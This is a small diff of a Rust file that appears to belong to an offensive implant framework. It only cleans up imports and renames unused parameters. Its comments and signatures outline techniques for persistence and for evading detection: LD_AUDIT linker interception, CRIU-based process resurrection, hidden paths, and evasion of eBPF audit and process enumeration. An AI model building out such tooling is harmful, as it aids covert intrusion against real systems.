@@ -9,8 +9,7 @@
 //! NOVEL-011: CRIU resurrection — process materializes without execve
 
 use std::io;
-use std::os::fd::AsRawFd;
-use tracing::{debug, error, info, warn};
+use tracing::{debug, info, warn};
 
 // ═════════════════════════════════════════════════════════════════════════════
 // NOVEL-007: LD_AUDIT — System-Wide Dynamic Linker Audit Interception
@@ -468,8 +467,8 @@ pub fn criu_persist_loop(
 /// - Audit subsystem (eBPF)
 /// - Process enumeration detection (LD_AUDIT + CRIU)
 pub fn deploy_full_uncovered_stack(
-    implant_path: &str,
-    implant_args: &[&str],
+    _implant_path: &str,
+    _implant_args: &[&str],
     hidden_paths: &[&str],
     checkpoint_dir: &str,
 ) -> io::Result<()> {
